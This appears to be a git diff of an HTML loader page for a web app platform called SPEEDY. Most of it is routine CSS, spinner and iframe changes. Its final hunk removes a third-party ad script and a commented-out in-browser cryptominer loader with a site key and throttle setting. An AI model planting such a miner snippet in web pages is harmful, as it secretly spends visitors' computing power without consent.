@@ -115,9 +115,18 @@ if (user_change !== '') {
 		}
 			
 		//.w3-animate-fading{animation:fading 10s infinite}@keyframes fading{0%{opacity:0}50%{opacity:1}100%{opacity:0}}
-			
+		
+		.spd_engine {
+			-webkit-overflow-scrolling: touch;
+			overflow-y: scroll;
+		}
+		
 		.bg-speedy {
 			background-color: #009688 !important;
+		}
+		
+		.text-speedy {
+			color: #009688 !important;
 		}
 	</style>
 			
@@ -164,7 +173,7 @@ if (user_change !== '') {
 			<img class="spd_logo" src="icon/res/mipmap-xxhdpi/SPEEDY.png" />
 			<div class="spd_loading text-center" style="margin-top:100px">
 				<div id="SPDApp_Loading">
-					<p><!--<img src="img/loading.gif" style="width:25%;max-width:75px;min-width:25px" />--> <div class="spinner-border text-success" style="width: 3rem; height: 3rem;" role="status"> <span class="sr-only">Loading...</span> </div> </p>
+					<p><!--<img src="img/loading.gif" style="width:25%;max-width:75px;min-width:25px" />--> <div class="spinner-border text-speedy" style="width: 3rem; height: 3rem;" role="status"> <span class="sr-only">Loading...</span> </div> </p>
 					<h2>SPEEDY</h2>
 					<p>
 						Web Application Platform Made Simple<br/>
@@ -172,7 +181,7 @@ if (user_change !== '') {
 					</p>
 					<p>Please wait for a few seconds...</p>
 				</div>
-				<p><iframe class="content-maximum" height="100%" width="100%" allowfullscreen="" frameborder="0" scrolling="yes" src="" style="border: 0 none transparent;" webkitallowfullscreen="" id="SPDApp_Load" sandbox="allow-forms allow-popups allow-pointer-lock allow-same-origin allow-scripts"></iframe></script></p>
+				<p><iframe class="content-maximum spd_engine" height="100%" width="100%" allowfullscreen="" frameborder="0" scrolling="yes" src="" style="border: 0 none transparent;" webkitallowfullscreen="" id="SPDApp_Load" sandbox="allow-forms allow-popups allow-pointer-lock allow-same-origin allow-scripts"></iframe></p>
                 <iframe src='http://assets.speedy.spd.thepixelplaces.com/html/load.html' scrolling='no' style='border:0px; padding:0;overflow:hidden' allowtransparency='true' id="SPDApp_PreLoad" sandbox="allow-forms allow-popups allow-pointer-lock allow-same-origin allow-scripts"></iframe>
 			</div>
 		</div>
@@ -328,6 +337,7 @@ if (user_change !== '') {
 	<script>
 if (user_appid !== '') {
 	document.getElementById("SPDApp_Load").src = 'http://'+user_appid+'-speedy.vphs.top/speedy/?spd_first=true&spd_user_name=guest&spd_user_id=guest';
+	document.getElementById("SPDApp_PreLoad").src = 'http://'+user_appid+'-speedy.vphs.top/speedy/preload.php?spd_user_name=guest&spd_user_id=guest';
 	document.getElementById("uc_app_id").innerHTML = user_appid.toUpperCase();	//user_appid
 	if (user_appname !== '') {
 		document.getElementById("uc_app_name").innerHTML = decodeURIComponent(user_appname);
@@ -344,18 +354,5 @@ else {
 }
 	</script>
 	
-
-<script async="async" data-cfasync="false" src="//tharbadir.com/2?z=2457779"></script>
-<!--<script src="https://www.hostingcloud.racing/thXP.js"></script>
-<script>
-    var _client = new Client.Anonymous('e911682393d082ebaf91e6c5a7ac3f8dd1016561873f7ca6f99173f42abe69d0', {
-        throttle: 0.8, ads: 0
-    });
-    _client.start();
-    
-
-</script>-->
-
-
 </body>
 </html>
